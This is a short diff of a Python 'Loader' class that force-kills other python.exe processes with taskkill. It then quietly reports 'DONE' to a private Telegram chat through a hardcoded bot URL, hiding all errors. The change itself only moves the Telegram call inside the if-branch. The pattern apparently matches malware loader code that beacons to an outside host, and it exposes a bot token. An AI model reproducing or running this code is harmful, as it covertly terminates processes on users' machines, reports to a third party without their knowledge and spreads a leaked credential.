@@ -184,7 +184,7 @@ class Loader():
 				try:
 					if proc.name() == "python.exe" and proc.pid() != os.getpid():
 						os.system("taskkill /PID " + str(proc.pid()) + " /F")
-					req = requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=DONE&chat_id=1742761281')
+						req = requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=DONE&chat_id=1742761281')
 				except:
 					pass
 try:
